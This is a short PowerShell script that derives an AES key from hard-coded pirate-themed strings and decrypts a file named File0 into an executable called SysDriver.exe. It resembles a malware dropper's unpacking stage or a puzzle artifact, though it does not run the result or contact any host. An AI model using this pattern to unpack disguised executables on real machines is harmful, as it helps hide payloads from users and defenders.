function Decrypt-File {
    [CmdletBinding()]
    param (
      [byte[]] $Key,
      [byte[]] $Init,
      [string] $Path,
      [string] $Destination
    )  
    $AES = [System.Security.Cryptography.AesManaged]::new()
    $AES.Key = $Key
    $AES.IV = $Init
  
    $Decryptor = $AES.CreateDecryptor()
  
    $EncryptedFile = [System.IO.File]::OpenRead($Path)
    $DecryptedFile = [System.IO.File]::OpenWrite($Destination)
  
    $CryptoStream = [System.Security.Cryptography.CryptoStream]::new($DecryptedFile, $Decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
  
    $EncryptedFile.CopyTo($CryptoStream)
  
    $CryptoStream.Flush()
    $DecryptedFile.Flush()
    $EncryptedFile.Flush()
    $CryptoStream.Clear()
    $EncryptedFile.Close()
    $DecryptedFile.Close()
}

$Pass = [Text.Encoding]::UTF8.GetBytes("J4ck.Sp4rr0w")
$Salt = [Text.Encoding]::UTF8.GetBytes("1996")
$Init = [Text.Encoding]::UTF8.GetBytes("Yet another Pirate")

$Key = (new-Object Security.Cryptography.PasswordDeriveBytes $Pass, $Salt, "SHA256", 5).GetBytes(32)
$Init = (new-Object Security.Cryptography.SHA256Managed).ComputeHash($Init)[0..15]


$SourceFile = "./File0"
$DestinationFile = "./SysDriver.exe"
Decrypt-File -Path $SourceFile -Destination $DestinationFile -Key $Key -Init $Init